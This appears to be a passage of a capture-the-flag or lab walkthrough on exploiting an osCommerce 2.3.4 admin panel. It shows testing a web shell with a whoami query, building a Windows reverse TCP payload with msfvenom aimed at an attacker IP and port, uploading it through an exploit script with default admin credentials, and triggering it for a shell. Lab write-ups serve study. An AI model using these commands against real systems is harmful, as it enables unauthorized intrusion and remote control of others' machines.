

![[Pasted image 20230910212212.png]]

Volla this means that shell might work 
![[Pasted image 20230910212352.png]]

Let's try to pass a query for ourself and see if it's working for us or not.
http://10.10.69.25:8080/oscommerce-2.3.4/catalog/admin/shell.php?cmd=whoami
![[Pasted image 20230910212430.png]]

Let's try to upload a reverse shell this time and see it works or not
We have to make a payload using msfvenom (i.e. a reverse tcp with the attacker ip and port address)
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.167.78 LPORT=4444 -f exe > shell.exe
![[Pasted image 20230910213747.png]]

Will run the above python script with this time will upload the shell.exe file and before that will setup the listener aka netcat

python 43191.py -u http://10.10.69.25:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.exe 
![[Pasted image 20230910214106.png]]

Now will open the link with the query shell=cmd which simply means that will trigger the payload
http://10.10.69.25:8080/oscommerce-2.3.4/catalog/admin/shell.php?cmd=shell
![[Pasted image 20230910214342.png]]
As it got stuck which is an indication that we got a shell 

![[Pasted image 20230910214424.png]]


